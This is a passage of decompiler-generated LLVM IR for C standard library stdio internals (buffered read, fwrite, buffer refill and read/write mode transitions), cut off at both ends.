  %v0_804ef9d = load i32, i32* %esi.global-to-local, align 4
  %v1_804ef9d = add i32 %v0_804ef9d, 4
  store i32 %v1_804ef9d, i32* %esi.global-to-local, align 4
  %v0_804efa0 = load i32, i32* %edx.global-to-local, align 4
  %v1_804efa0 = load i32, i32* %edi.global-to-local, align 4
  %v2_804efa0 = add i32 %v1_804efa0, %v0_804efa0
  store i32 %v2_804efa0, i32* %edx.global-to-local, align 4
  %v0_804efa2 = load i32, i32* @ecx, align 4
  %v1_804efa2 = add i32 %v0_804efa2, -1
  %v8_804efa2 = icmp eq i32 %v1_804efa2, 0
  store i32 %v1_804efa2, i32* @ecx, align 4
  %v1_804efa5 = icmp eq i1 %v8_804efa2, false
  br i1 %v1_804efa5, label %dec_label_pc_804ef90, label %dec_label_pc_804efa7

dec_label_pc_804efa7:                             ; preds = %dec_label_pc_804ef9d, %dec_label_pc_804ef89, %dec_label_pc_804ef75
  %v0_804efaf = phi i32 [ 0, %dec_label_pc_804ef75 ], [ %v2_804ef89, %dec_label_pc_804ef89 ], [ %v1_804ef9d, %dec_label_pc_804ef9d ]
  %v0_804efab = phi i32 [ %v0_804efab.pre, %dec_label_pc_804ef75 ], [ %v2_804ef971532, %dec_label_pc_804ef89 ], [ %v2_804efa0, %dec_label_pc_804ef9d ]
  %v2_804efa7 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804efa7, i32* %eax.global-to-local, align 4
  %v12_804efab = icmp eq i32 %v0_804efab, %v2_804efa7
  br i1 %v12_804efab, label %dec_label_pc_804efb2, label %dec_label_pc_804efaf

dec_label_pc_804efaf:                             ; preds = %dec_label_pc_804efa7
  %v1_804efaf = load i32, i32* %ebp.global-to-local, align 4
  %v2_804efaf = inttoptr i32 %v1_804efaf to i32*
  store i32 %v0_804efaf, i32* %v2_804efaf, align 4
  br label %dec_label_pc_804efb2

dec_label_pc_804efb2:                             ; preds = %dec_label_pc_804efa7, %dec_label_pc_804efaf
  %v0_804efb2 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_804efb2, i32* %eax.global-to-local, align 4
  %v1_804efb4 = load i32, i32* @ecx, align 4
  %v2_804efb4 = sub i32 %v0_804efb2, %v1_804efb4
  br label %dec_label_pc_804efb6

dec_label_pc_804efb6:                             ; preds = %dec_label_pc_804ef65, %dec_label_pc_804efb2
  %storemerge1 = phi i32 [ %v2_804efb4, %dec_label_pc_804efb2 ], [ -1, %dec_label_pc_804ef65 ]
  store i32 %storemerge1, i32* %eax.global-to-local, align 4
  store i32 %v0_804ef3b, i32* @ebx, align 4
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i32 %v2_804efa0, { 0, 2, 1 }
  uselistorder i32 %v1_804ef9d, { 0, 2, 1 }
  uselistorder i32 %v2_804ef89, { 1, 0, 2 }
  uselistorder i32 %v0_804ef8c, { 1, 0 }
  uselistorder i32 %v2_804ef971532, { 1, 0 }
  uselistorder i32 %v4_804ef3f, { 1, 0, 2 }
  uselistorder i32* %esi.global-to-local, { 0, 2, 3, 1 }
  uselistorder i32* %edx.global-to-local, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32* %edi.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %eax.global-to-local, { 2, 0, 1, 3, 4, 6, 5, 7 }
  uselistorder i32 127, { 1, 4, 0, 3, 2 }
  uselistorder i32 84, { 3, 4, 0, 5, 1, 2 }
  uselistorder i8* null, { 5, 3, 6, 7, 2, 9, 0, 1, 8, 10, 11, 4 }
  uselistorder i32 %arg4, { 2, 1, 0, 3 }
  uselistorder i32 %arg3, { 0, 1, 3, 4, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804efb6, { 1, 0 }
  uselistorder label %dec_label_pc_804efb2, { 1, 0 }
  uselistorder label %dec_label_pc_804ef90, { 1, 0 }
  uselistorder label %dec_label_pc_804ef89, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804ef7f, { 1, 0 }
}

define i32 @__stdio_READ(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804efc0 = load i32, i32* @ebx, align 4
  store i32 %v0_804efc0, i32* %stack_var_-4, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v4_804efc6 = ptrtoint i16* %arg1 to i32
  store i32 %v4_804efc6, i32* @ebx, align 4
  %v1_804efce = bitcast i16* %arg1 to i8*
  %v2_804efce = load i8, i8* %v1_804efce, align 1
  %v3_804efce = and i8 %v2_804efce, 4
  %v4_804efce = icmp eq i8 %v3_804efce, 0
  %v1_804efd1 = icmp eq i1 %v4_804efce, false
  br i1 %v1_804efd1, label %dec_label_pc_804f000, label %dec_label_pc_804efd3

dec_label_pc_804efd3:                             ; preds = %entry
  %v2_804efd3 = icmp slt i32 %arg3, 0
  %v1_804efd5 = icmp eq i1 %v2_804efd3, false
  br i1 %v1_804efd5, label %dec_label_pc_804efdc, label %dec_label_pc_804efd7

dec_label_pc_804efd7:                             ; preds = %dec_label_pc_804efd3
  br label %dec_label_pc_804efdc

dec_label_pc_804efdc:                             ; preds = %dec_label_pc_804efd3, %dec_label_pc_804efd7
  %v0_804efdd = phi i32 [ %arg3, %dec_label_pc_804efd3 ], [ 2147483647, %dec_label_pc_804efd7 ]
  %v1_804efe2 = add i32 %v4_804efc6, 4
  %v2_804efe2 = inttoptr i32 %v1_804efe2 to i32*
  %v3_804efe2 = load i32, i32* %v2_804efe2, align 4
  %v4_804efe5 = inttoptr i32 %arg2 to i32*
  %v5_804efe5 = call i32 @__libc_read(i32 %v3_804efe2, i32* %v4_804efe5, i32 %v0_804efdd, i32 0)
  store i32 %v5_804efe5, i32* %eax.global-to-local, align 4
  %tmp13 = icmp slt i32 %v5_804efe5, 1
  %tmp14 = icmp eq i1 %tmp13, false
  br i1 %tmp14, label %dec_label_pc_804f000, label %dec_label_pc_804eff2

dec_label_pc_804eff2:                             ; preds = %dec_label_pc_804efdc
  %v1_804efed = icmp eq i32 %v5_804efe5, 0
  %v4_804eff0 = icmp eq i1 %v1_804efed, false
  %v0_804effa = load i32, i32* @ebx, align 4
  %v1_804effa = inttoptr i32 %v0_804effa to i16*
  %v2_804effa = load i16, i16* %v1_804effa, align 2
  br i1 %v4_804eff0, label %dec_label_pc_804effa, label %dec_label_pc_804eff4

dec_label_pc_804eff4:                             ; preds = %dec_label_pc_804eff2
  %v3_804eff4 = or i16 %v2_804effa, 4
  store i16 %v3_804eff4, i16* %v1_804effa, align 2
  %v0_804f003.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f000

dec_label_pc_804effa:                             ; preds = %dec_label_pc_804eff2
  %v3_804effa = or i16 %v2_804effa, 8
  store i16 %v3_804effa, i16* %v1_804effa, align 2
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f000

dec_label_pc_804f000:                             ; preds = %entry, %dec_label_pc_804efdc, %dec_label_pc_804eff4, %dec_label_pc_804effa
  %v0_804f003 = phi i32 [ 0, %entry ], [ %v5_804efe5, %dec_label_pc_804efdc ], [ %v0_804f003.pre, %dec_label_pc_804eff4 ], [ 0, %dec_label_pc_804effa ]
  %v2_804f002 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804f002, i32* @ebx, align 4
  ret i32 %v0_804f003

; uselistorder directives
  uselistorder i16 %v2_804effa, { 1, 0 }
  uselistorder i32 %v5_804efe5, { 1, 2, 0, 3 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32 2147483647, { 0, 2, 1, 3 }
  uselistorder i8 4, { 2, 1, 0, 3, 4 }
  uselistorder i16* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804f000, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804efdc, { 1, 0 }
}

define i32 @__stdio_fwrite(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804f004 = load i32, i32* @ebp, align 4
  %v0_804f005 = load i32, i32* @edi, align 4
  %v0_804f006 = load i32, i32* @esi, align 4
  %v0_804f007 = load i32, i32* @ebx, align 4
  store i32 %v0_804f007, i32* %stack_var_-16, align 4
  store i32 %arg3, i32* @ebx, align 4
  store i32 %arg1, i32* @ebp, align 4
  store i32 %arg2, i32* @edi, align 4
  %v1_804f017 = add i32 %arg3, 1
  %v2_804f017 = inttoptr i32 %v1_804f017 to i8*
  %v3_804f017 = load i8, i8* %v2_804f017, align 1
  %v4_804f017 = and i8 %v3_804f017, 2
  %v5_804f017 = icmp eq i8 %v4_804f017, 0
  %v1_804f01b = icmp eq i1 %v5_804f017, false
  br i1 %v1_804f01b, label %dec_label_pc_804f0d2, label %dec_label_pc_804f021

dec_label_pc_804f021:                             ; preds = %entry
  %v1_804f021 = add i32 %arg3, 4
  %v2_804f021 = inttoptr i32 %v1_804f021 to i32*
  %v3_804f021 = load i32, i32* %v2_804f021, align 4
  %v13_804f021 = icmp eq i32 %v3_804f021, -2
  %v1_804f025 = add i32 %arg3, 16
  %v2_804f025 = inttoptr i32 %v1_804f025 to i32*
  %v3_804f025 = load i32, i32* %v2_804f025, align 4
  store i32 %v3_804f025, i32* @edx, align 4
  %v1_804f028 = add i32 %arg3, 12
  %v2_804f028 = inttoptr i32 %v1_804f028 to i32*
  %v3_804f028 = load i32, i32* %v2_804f028, align 4
  %v1_804f02b = icmp eq i1 %v13_804f021, false
  %v2_804f04b = sub i32 %v3_804f028, %v3_804f025
  store i32 %v2_804f04b, i32* %eax.global-to-local, align 4
  br i1 %v1_804f02b, label %dec_label_pc_804f04b, label %dec_label_pc_804f02d

dec_label_pc_804f02d:                             ; preds = %dec_label_pc_804f021
  %tmp22 = icmp ult i32 %v2_804f04b, %arg2
  br i1 %tmp22, label %dec_label_pc_804f035, label %dec_label_pc_804f037

dec_label_pc_804f035:                             ; preds = %dec_label_pc_804f02d
  br label %dec_label_pc_804f037

dec_label_pc_804f037:                             ; preds = %dec_label_pc_804f02d, %dec_label_pc_804f035
  %storemerge = phi i32 [ %v2_804f04b, %dec_label_pc_804f035 ], [ %arg2, %dec_label_pc_804f02d ]
  %v0_804f038 = phi i32 [ %v2_804f04b, %dec_label_pc_804f035 ], [ %arg2, %dec_label_pc_804f02d ]
  store i32 %storemerge, i32* @esi, align 4
  %v3_804f03b = inttoptr i32 %v3_804f025 to i16*
  %v4_804f03b = call i32 @memcpy(i16* %v3_804f03b, i32 %v0_804f038, i32 %v2_804f04b)
  store i32 %v4_804f03b, i32* %eax.global-to-local, align 4
  %v0_804f040 = load i32, i32* @ebx, align 4
  %v1_804f040 = add i32 %v0_804f040, 16
  %v2_804f040 = inttoptr i32 %v1_804f040 to i32*
  %v3_804f040 = load i32, i32* %v2_804f040, align 4
  %v4_804f040 = load i32, i32* @esi, align 4
  %v5_804f040 = add i32 %v4_804f040, %v3_804f040
  store i32 %v5_804f040, i32* %v2_804f040, align 4
  br label %dec_label_pc_804f0ea

dec_label_pc_804f04b:                             ; preds = %dec_label_pc_804f021
  %v6_804f04f = icmp ult i32 %v2_804f04b, %arg2
  br i1 %v6_804f04f, label %dec_label_pc_804f0b9, label %dec_label_pc_804f051

dec_label_pc_804f051:                             ; preds = %dec_label_pc_804f04b
  %v0_804f051 = load i32, i32* @ecx, align 4
  %v3_804f055 = inttoptr i32 %v3_804f025 to i16*
  %v4_804f055 = call i32 @memcpy(i16* %v3_804f055, i32 %arg2, i32 %v0_804f051)
  store i32 %v4_804f055, i32* %eax.global-to-local, align 4
  %v0_804f05a = load i32, i32* @ebx, align 4
  %v1_804f05a = add i32 %v0_804f05a, 16
  %v2_804f05a = inttoptr i32 %v1_804f05a to i32*
  %v3_804f05a = load i32, i32* %v2_804f05a, align 4
  %v4_804f05a = load i32, i32* @edi, align 4
  %v5_804f05a = add i32 %v4_804f05a, %v3_804f05a
  store i32 %v5_804f05a, i32* %v2_804f05a, align 4
  %v0_804f060 = load i32, i32* @ebx, align 4
  %v1_804f060 = add i32 %v0_804f060, 1
  %v2_804f060 = inttoptr i32 %v1_804f060 to i8*
  %v3_804f060 = load i8, i8* %v2_804f060, align 1
  %v4_804f060 = urem i8 %v3_804f060, 2
  %v5_804f060 = icmp eq i8 %v4_804f060, 0
  br i1 %v5_804f060, label %dec_label_pc_804f0ea, label %dec_label_pc_804f06a

dec_label_pc_804f06a:                             ; preds = %dec_label_pc_804f051
  %v0_804f06a = load i32, i32* @edx, align 4
  %v0_804f06b = load i32, i32* @edi, align 4
  %v4_804f06f = call i32 @memrchr(i8 10, i32 %v0_804f06b, i32 %v0_804f06a)
  store i32 %v4_804f06f, i32* %eax.global-to-local, align 4
  %v1_804f077 = icmp eq i32 %v4_804f06f, 0
  br i1 %v1_804f077, label %dec_label_pc_804f0ea, label %dec_label_pc_804f07b

dec_label_pc_804f07b:                             ; preds = %dec_label_pc_804f06a
  %v0_804f07e = load i32, i32* @ebx, align 4
  %v1_804f07f = call i32 @__stdio_wcommit(i32 %v0_804f07e)
  store i32 %v1_804f07f, i32* %eax.global-to-local, align 4
  %v1_804f087 = icmp eq i32 %v1_804f07f, 0
  br i1 %v1_804f087, label %dec_label_pc_804f0ea, label %dec_label_pc_804f08b

dec_label_pc_804f08b:                             ; preds = %dec_label_pc_804f07b
  %v0_804f08b = load i32, i32* @edi, align 4
  %tmp23 = icmp ugt i32 %v0_804f08b, %v1_804f07f
  br i1 %tmp23, label %dec_label_pc_804f091, label %dec_label_pc_804f093

dec_label_pc_804f091:                             ; preds = %dec_label_pc_804f08b
  br label %dec_label_pc_804f093

dec_label_pc_804f093:                             ; preds = %dec_label_pc_804f08b, %dec_label_pc_804f091
  %storemerge24 = phi i32 [ %v1_804f07f, %dec_label_pc_804f091 ], [ %v0_804f08b, %dec_label_pc_804f08b ]
  %v0_804f09a = phi i32 [ %v1_804f07f, %dec_label_pc_804f091 ], [ %v0_804f08b, %dec_label_pc_804f08b ]
  store i32 %storemerge24, i32* %esi.global-to-local, align 4
  %v2_804f095 = sub i32 %v0_804f08b, %v0_804f09a
  store i32 %v2_804f095, i32* %eax.global-to-local, align 4
  %v0_804f097 = load i32, i32* @ebp, align 4
  %v2_804f097 = add i32 %v0_804f097, %v2_804f095
  store i32 %v2_804f097, i32* %ebp.global-to-local, align 4
  %v4_804f09e = call i32 @__GI_memchr(i8* inttoptr (i32 10 to i8*), i32 %v0_804f09a, i32 %v2_804f095)
  store i32 %v4_804f09e, i32* %eax.global-to-local, align 4
  store i32 %v4_804f09e, i32* @edx, align 4
  %v1_804f0a8 = icmp eq i32 %v4_804f09e, 0
  br i1 %v1_804f0a8, label %dec_label_pc_804f0ea, label %dec_label_pc_804f0ac

dec_label_pc_804f0ac:                             ; preds = %dec_label_pc_804f093
  %v0_804f0ac = load i32, i32* %ebp.global-to-local, align 4
  %v1_804f0ac = load i32, i32* %esi.global-to-local, align 4
  %v2_804f0ac = sub i32 %v0_804f0ac, %v4_804f09e
  %v2_804f0b0 = add i32 %v2_804f0ac, %v1_804f0ac
  store i32 %v2_804f0b0, i32* %eax.global-to-local, align 4
  %v0_804f0b2 = load i32, i32* @ebx, align 4
  %v1_804f0b2 = add i32 %v0_804f0b2, 16
  %v2_804f0b2 = inttoptr i32 %v1_804f0b2 to i32*
  %v3_804f0b2 = load i32, i32* %v2_804f0b2, align 4
  %v5_804f0b2 = sub i32 %v3_804f0b2, %v2_804f0b0
  store i32 %v5_804f0b2, i32* %v2_804f0b2, align 4
  %v0_804f0b5 = load i32, i32* @edi, align 4
  %v1_804f0b5 = load i32, i32* %eax.global-to-local, align 4
  %v2_804f0b5 = sub i32 %v0_804f0b5, %v1_804f0b5
  store i32 %v2_804f0b5, i32* @edi, align 4
  br label %dec_label_pc_804f0ea

dec_label_pc_804f0b9:                             ; preds = %dec_label_pc_804f04b
  %v2_804f0b9 = add i32 %arg3, 8
  %v3_804f0b9 = inttoptr i32 %v2_804f0b9 to i32*
  %v4_804f0b9 = load i32, i32* %v3_804f0b9, align 4
  %v15_804f0b9 = icmp eq i32 %v3_804f025, %v4_804f0b9
  br i1 %v15_804f0b9, label %dec_label_pc_804f0d2, label %dec_label_pc_804f0be

dec_label_pc_804f0be:                             ; preds = %dec_label_pc_804f0b9
  %v1_804f0c2 = call i32 @__stdio_wcommit(i32 %arg3)
  store i32 %v1_804f0c2, i32* %eax.global-to-local, align 4
  %v1_804f0ca = icmp eq i32 %v1_804f0c2, 0
  br i1 %v1_804f0ca, label %dec_label_pc_804f0be.dec_label_pc_804f0d2_crit_edge, label %dec_label_pc_804f0ce

dec_label_pc_804f0be.dec_label_pc_804f0d2_crit_edge: ; preds = %dec_label_pc_804f0be
  %v0_804f0d2.pre = load i32, i32* @edi, align 4
  %v0_804f0da.pre = load i32, i32* @ebx, align 4
  %v2_804f0e1.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_804f0d2

dec_label_pc_804f0ce:                             ; preds = %dec_label_pc_804f0be
  store i32 0, i32* @edi, align 4
  br label %dec_label_pc_804f0ea

dec_label_pc_804f0d2:                             ; preds = %dec_label_pc_804f0be.dec_label_pc_804f0d2_crit_edge, %dec_label_pc_804f0b9, %entry
  %v2_804f0e1 = phi i32 [ %v2_804f0e1.pre, %dec_label_pc_804f0be.dec_label_pc_804f0d2_crit_edge ], [ %v0_804f007, %dec_label_pc_804f0b9 ], [ %v0_804f007, %entry ]
  %v0_804f0da = phi i32 [ %v0_804f0da.pre, %dec_label_pc_804f0be.dec_label_pc_804f0d2_crit_edge ], [ %arg3, %dec_label_pc_804f0b9 ], [ %arg3, %entry ]
  %v0_804f0d2 = phi i32 [ %v0_804f0d2.pre, %dec_label_pc_804f0be.dec_label_pc_804f0d2_crit_edge ], [ %arg2, %dec_label_pc_804f0b9 ], [ %arg2, %entry ]
  store i32 %v2_804f0e1, i32* @ebx, align 4
  store i32 %v0_804f005, i32* @edi, align 4
  %v4_804f0e5 = inttoptr i32 %v0_804f0da to i16*
  %v5_804f0e5 = call i32 @__stdio_WRITE(i16* %v4_804f0e5, i32 %v0_804f0d2, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_804f0e5, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f0ea

dec_label_pc_804f0ea:                             ; preds = %dec_label_pc_804f093, %dec_label_pc_804f07b, %dec_label_pc_804f06a, %dec_label_pc_804f051, %dec_label_pc_804f0ce, %dec_label_pc_804f0ac, %dec_label_pc_804f037, %dec_label_pc_804f0d2
  %v0_804f0ed = load i32, i32* @edi, align 4
  store i32 %v0_804f0ed, i32* %eax.global-to-local, align 4
  %v2_804f0ef = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804f0ef, i32* @ebx, align 4
  store i32 %v0_804f006, i32* @esi, align 4
  store i32 %v0_804f005, i32* @edi, align 4
  store i32 %v0_804f004, i32* @ebp, align 4
  ret i32 %v0_804f0ed

; uselistorder directives
  uselistorder i32 %v2_804f0b0, { 1, 0 }
  uselistorder i32 %v4_804f09e, { 0, 2, 1, 3 }
  uselistorder i32 %v2_804f095, { 1, 0, 2 }
  uselistorder i32 %v0_804f08b, { 3, 0, 1, 2 }
  uselistorder i32 %v2_804f04b, { 3, 4, 0, 1, 2, 5 }
  uselistorder i32 %v0_804f005, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %esi.global-to-local, { 1, 0 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32 ptrtoint (i32* @0 to i32), { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 21, 22, 17, 18, 19, 20, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder i8 10, { 11, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32 (i16*, i32, i32)* @memcpy, { 0, 1, 5, 6, 2, 3, 13, 4, 7, 8, 9, 14, 10, 11, 15, 16, 17, 12 }
  uselistorder i8 2, { 4, 13, 5, 0, 1, 2, 3, 12, 18, 14, 6, 15, 7, 8, 9, 10, 16, 17, 11 }
  uselistorder i32 %arg3, { 0, 1, 2, 3, 5, 4, 6, 8, 7 }
  uselistorder i32 %arg2, { 4, 5, 6, 3, 0, 1, 2, 7 }
  uselistorder label %dec_label_pc_804f0ea, { 7, 4, 5, 0, 1, 2, 3, 6 }
  uselistorder label %dec_label_pc_804f093, { 1, 0 }
  uselistorder label %dec_label_pc_804f037, { 1, 0 }
}

define i32 @__stdio_rfill(i32 %arg1) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %v0_804f0f4 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_804f0fc = add i32 %arg1, 8
  %v2_804f0fc = inttoptr i32 %v1_804f0fc to i32*
  %v3_804f0fc = load i32, i32* %v2_804f0fc, align 4
  store i32 %v3_804f0fc, i32* %edx.global-to-local, align 4
  %v1_804f0ff = add i32 %arg1, 12
  %v2_804f0ff = inttoptr i32 %v1_804f0ff to i32*
  %v3_804f0ff = load i32, i32* %v2_804f0ff, align 4
  %v2_804f102 = sub i32 %v3_804f0ff, %v3_804f0fc
  %v3_804f107 = inttoptr i32 %arg1 to i16*
  %v4_804f107 = call i32 @__stdio_READ(i16* %v3_804f107, i32 %v3_804f0fc, i32 %v2_804f102)
  %v0_804f10c = load i32, i32* @ebx, align 4
  %v1_804f10c = add i32 %v0_804f10c, 8
  %v2_804f10c = inttoptr i32 %v1_804f10c to i32*
  %v3_804f10c = load i32, i32* %v2_804f10c, align 4
  store i32 %v3_804f10c, i32* %edx.global-to-local, align 4
  %v2_804f10f = add i32 %v0_804f10c, 16
  %v3_804f10f = inttoptr i32 %v2_804f10f to i32*
  store i32 %v3_804f10c, i32* %v3_804f10f, align 4
  %v0_804f112 = load i32, i32* %edx.global-to-local, align 4
  %v2_804f112 = add i32 %v0_804f112, %v4_804f107
  store i32 %v2_804f112, i32* %edx.global-to-local, align 4
  %v1_804f114 = load i32, i32* @ebx, align 4
  %v2_804f114 = add i32 %v1_804f114, 20
  %v3_804f114 = inttoptr i32 %v2_804f114 to i32*
  store i32 %v2_804f112, i32* %v3_804f114, align 4
  store i32 %v0_804f0f4, i32* @ebx, align 4
  ret i32 %v4_804f107

; uselistorder directives
  uselistorder i32 %v4_804f107, { 1, 0 }
  uselistorder i32 (i16*, i32, i32)* @__stdio_READ, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
}

define i32 @__stdio_trans2r_o(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_804f11c = load i32, i32* @ebx, align 4
  %v4_804f120 = ptrtoint i16* %arg1 to i32
  store i32 %v4_804f120, i32* @ebx, align 4
  store i32 %arg2, i32* @ecx, align 4
  %v1_804f128 = bitcast i16* %arg1 to i32*
  %v2_804f128 = load i32, i32* %v1_804f128, align 4
  %v1_804f12a = urem i32 %v2_804f128, 65536
  %v2_804f12d = and i32 %v1_804f12a, %arg2
  %v3_804f12d = icmp eq i32 %v2_804f12d, 0
  %v1_804f12f = icmp eq i1 %v3_804f12d, false
  br i1 %v1_804f12f, label %dec_label_pc_804f13e, label %dec_label_pc_804f131

dec_label_pc_804f131:                             ; preds = %entry
  %v1_804f131 = and i32 %v2_804f128, 2176
  %v2_804f131 = icmp eq i32 %v1_804f131, 0
  %v1_804f137 = icmp eq i1 %v2_804f131, false
  br i1 %v1_804f137, label %dec_label_pc_804f145, label %dec_label_pc_804f139

dec_label_pc_804f139:                             ; preds = %dec_label_pc_804f131
  %v2_804f139 = or i32 %v2_804f128, %arg2
  %v1_804f13b = trunc i32 %v2_804f139 to i16
  store i16 %v1_804f13b, i16* %arg1, align 2
  %v0_804f13e.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804f13e

dec_label_pc_804f13e:                             ; preds = %entry, %dec_label_pc_804f139
  %v0_804f160 = phi i32 [ %v4_804f120, %entry ], [ %v0_804f13e.pre, %dec_label_pc_804f139 ]
  %v1_804f13e = inttoptr i32 %v0_804f160 to i16*
  %v2_804f13e = load i16, i16* %v1_804f13e, align 2
  %v2_804f141 = and i16 %v2_804f13e, 16
  %v3_804f141 = icmp eq i16 %v2_804f141, 0
  br i1 %v3_804f141, label %dec_label_pc_804f159, label %dec_label_pc_804f145

dec_label_pc_804f145:                             ; preds = %dec_label_pc_804f13e, %dec_label_pc_804f131
  %v1_804f145 = call i32 @__errno_location(i32 %v0_804f11c)
  %v1_804f14a = inttoptr i32 %v1_804f145 to i32*
  store i32 9, i32* %v1_804f14a, align 4
  br label %dec_label_pc_804f150

dec_label_pc_804f150:                             ; preds = %dec_label_pc_804f15d, %dec_label_pc_804f145
  %v0_804f150 = load i32, i32* @ebx, align 4
  %v1_804f150 = inttoptr i32 %v0_804f150 to i16*
  %v2_804f150 = load i16, i16* %v1_804f150, align 2
  %v3_804f150 = or i16 %v2_804f150, 8
  store i16 %v3_804f150, i16* %v1_804f150, align 2
  br label %dec_label_pc_804f17d

dec_label_pc_804f159:                             ; preds = %dec_label_pc_804f13e
  %v2_804f159 = and i16 %v2_804f13e, 64
  %v3_804f159 = icmp eq i16 %v2_804f159, 0
  br i1 %v3_804f159, label %dec_label_pc_804f177, label %dec_label_pc_804f15d

dec_label_pc_804f15d:                             ; preds = %dec_label_pc_804f159
  %v2_804f161 = call i32 @__stdio_wcommit(i32 %v0_804f160)
  %v1_804f169 = icmp eq i32 %v2_804f161, 0
  %v1_804f16b = icmp eq i1 %v1_804f169, false
  br i1 %v1_804f16b, label %dec_label_pc_804f150, label %dec_label_pc_804f16d

dec_label_pc_804f16d:                             ; preds = %dec_label_pc_804f15d
  %v0_804f16d = load i32, i32* @ebx, align 4
  %v1_804f16d = inttoptr i32 %v0_804f16d to i16*
  %v2_804f16d = load i16, i16* %v1_804f16d, align 2
  %v3_804f16d = and i16 %v2_804f16d, -65
  store i16 %v3_804f16d, i16* %v1_804f16d, align 2
  %v0_804f171 = load i32, i32* @ebx, align 4
  %v1_804f171 = add i32 %v0_804f171, 8
  %v2_804f171 = inttoptr i32 %v1_804f171 to i32*
  %v3_804f171 = load i32, i32* %v2_804f171, align 4
  %v2_804f174 = add i32 %v0_804f171, 28
  %v3_804f174 = inttoptr i32 %v2_804f174 to i32*
  store i32 %v3_804f171, i32* %v3_804f174, align 4
  %v0_804f177.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804f177

dec_label_pc_804f177:                             ; preds = %dec_label_pc_804f159, %dec_label_pc_804f16d
  %v9_804f177 = phi i32 [ %v0_804f160, %dec_label_pc_804f159 ], [ %v0_804f177.pre, %dec_label_pc_804f16d ]
  %v1_804f177 = inttoptr i32 %v9_804f177 to i16*
  %v2_804f177 = load i16, i16* %v1_804f177, align 2
  %v3_804f177 = or i16 %v2_804f177, 1
  store i16 %v3_804f177, i16* %v1_804f177, align 2
  br label %dec_label_pc_804f17d

dec_label_pc_804f17d:                             ; preds = %dec_label_pc_804f150, %dec_label_pc_804f177
  %storemerge = phi i32 [ 0, %dec_label_pc_804f177 ], [ -1, %dec_label_pc_804f150 ]
  store i32 %v0_804f11c, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_804f128, { 1, 2, 0 }
  uselistorder i32 %v0_804f11c, { 1, 0 }
  uselistorder i16 1, { 1, 2, 0 }
  uselistorder i16* %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804f17d, { 1, 0 }
  uselistorder label %dec_label_pc_804f177, { 1, 0 }
  uselistorder label %dec_label_pc_804f13e, { 1, 0 }
}

define i32 @__stdio_trans2w_o(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_804f184 = load i32, i32* @ebx, align 4
  %v4_804f188 = ptrtoint i16* %arg1 to i32
  store i32 %v4_804f188, i32* @ebx, align 4
  store i32 %arg2, i32* @ecx, align 4
  %v1_804f190 = bitcast i16* %arg1 to i32*
  %v2_804f190 = load i32, i32* %v1_804f190, align 4
  store i32 %v2_804f190, i32* %eax.global-to-local, align 4
  %v1_804f192 = urem i32 %v2_804f190, 65536
  store i32 %v1_804f192, i32* %edx.global-to-local, align 4
  %v2_804f195 = and i32 %v1_804f192, %arg2
  %v3_804f195 = icmp eq i32 %v2_804f195, 0
  %v1_804f197 = icmp eq i1 %v3_804f195, false
  br i1 %v1_804f197, label %dec_label_pc_804f1a6, label %dec_label_pc_804f199

dec_label_pc_804f199:                             ; preds = %entry
  %v1_804f199 = and i32 %v2_804f190, 2176
  %v2_804f199 = icmp eq i32 %v1_804f199, 0
  store i32 %v1_804f199, i32* %edx.global-to-local, align 4
  %v1_804f19f = icmp eq i1 %v2_804f199, false
  br i1 %v1_804f19f, label %dec_label_pc_804f1ae, label %dec_label_pc_804f1a1

dec_label_pc_804f1a1:                             ; preds = %dec_label_pc_804f199
  %v2_804f1a1 = or i32 %v2_804f190, %arg2
  store i32 %v2_804f1a1, i32* %eax.global-to-local, align 4
